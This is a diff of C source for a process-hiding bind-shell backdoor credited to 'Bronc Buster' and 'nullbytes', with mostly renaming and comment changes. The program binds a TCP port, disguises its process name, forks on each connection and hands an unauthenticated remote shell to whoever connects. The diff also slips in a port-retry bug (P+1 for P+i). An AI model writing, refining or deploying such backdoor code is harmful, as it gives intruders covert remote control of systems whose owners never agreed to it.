@@ -25,52 +25,58 @@ char *con 	= "\nConnected!\n\n";
 char *credit 	= "This fine tool coded by Bronc Buster\n";
 char *credit2 	= "and refined by nullbytes\n";
 char *instr	= "Command delimited by ';'\n";
-char *credit22	= "FOR TEMPORARY USE ONLY\n";
-int outsock, insock, sz; 
-
-/* change this is a int now so it can self fix bind issue */
+char *instr2	= "FOR TEMPORARY USE ONLY\n";
+int net_out, net_in, size; 
 
 int P = 123; // for the love of anything holy change this
 
-/* set up two structs for in and out */
 struct sockaddr_in home;
 struct sockaddr_in away;
-/* set port, proto and bzero for BIND */
 home.sin_family=AF_INET;
 home.sin_port=htons(P);
 home.sin_addr.s_addr=INADDR_ANY;
 bzero(&(home.sin_zero),8);
 
-/* changing the name that will appear */
+  ////////////////////////////////////////////////////////////////////
+ //////////////////////End of declerations///////////////////////////
+////////////////////////////////////////////////////////////////////
+
+
+//changing the name in a not so sneaky way... 
 strcpy(argv[0],HIDE);
 
-/* catch the SIG */
+//hush now....
 signal(SIGCHLD,SIG_IGN);
 
-/* here we go! */
-if((outsock=socket(AF_INET,SOCK_STREAM,0))<0)
+// Will later incorperate logic to attempt correction
+if((net_out=socket(AF_INET,SOCK_STREAM,0))<0)
 	exit(printf("Socket error\n"));
 
-/* this loop tries the next port if bind fails */
+// this loop tries the next port if bind fails 
 int i = 1;
 for (i = 1; i < 4; i++)	{ 
-	if((bind(outsock,(struct sockaddr *)&home,sizeof(home))<0))
+	if((bind(net_out,(struct sockaddr *)&home,sizeof(home))<0))
 	{
 		printf("Bind error is the port in use?\n");
 		printf("port %i didn't work trying %i\n", P, P+i); 
-		home.sin_port=htons(P+i);                        	
+		//This is almost certianly a bad idea. 
+		home.sin_port=htons(P+1);
 	}
 	else	
 	{
+		//This doesn't always print on sucessful execution.
 		printf("were good,  we're at port %i", P);
 		break;
 	}
 
 }
-if((listen(outsock,LISTN))<0)
-  exit(printf("Listen error: I have no idea what went wrong\n"));
+if((listen(net_out,LISTN))<0)	
+{
+  printf("Listen error: I have no idea what went wrong\nLEAVING");
+  exit(-1);
+}
 
-sz=sizeof(struct sockaddr_in);
+size=sizeof(struct sockaddr_in);
 
 /* infinate loop - wait for accept*/
 for(;;)
@@ -79,23 +85,23 @@ for(;;)
    * show so high on the command top*/
   sleep(5);
  
-  if((insock=accept(outsock,(struct sockaddr *)&away, &sz))<0)
+  if((net_in=accept(net_out,(struct sockaddr *)&away, &size))<0)
     exit(printf("Accept error"));
   if(fork() !=0)
     {
-    send(insock,con,strlen(con),0); /* send out welcome mesg */
-    send(insock,credit,strlen(credit),0);
-    send(insock,credit2,strlen(credit2),0);
-    send(insock,instr,strlen(instr),0);
-    send(insock,credit22,strlen(credit22),0);
-    dup2(insock,0); /* open stdin  */
-    dup2(insock,1); /* open stdout */
-    dup2(insock,2); /* open stderr */
+    send(net_in,con,strlen(con),0); /* send out welcome mesg */
+    send(net_in,credit,strlen(credit),0);
+    send(net_in,credit2,strlen(credit2),0);
+    send(net_in,instr,strlen(instr),0);
+    send(net_in,instr2,strlen(instr2),0);
+    dup2(net_in,0); /* open stdin  */
+    dup2(net_in,1); /* open stdout */
+    dup2(net_in,2); /* open stderr */
     execl(SH,SH,(char *)0); /* start our shell */
-    close(insock);
+    close(net_in);
     exit(0); /* all done, leave and close sock */
     }
-  close(insock);
+  close(net_in);
   }
 }
 
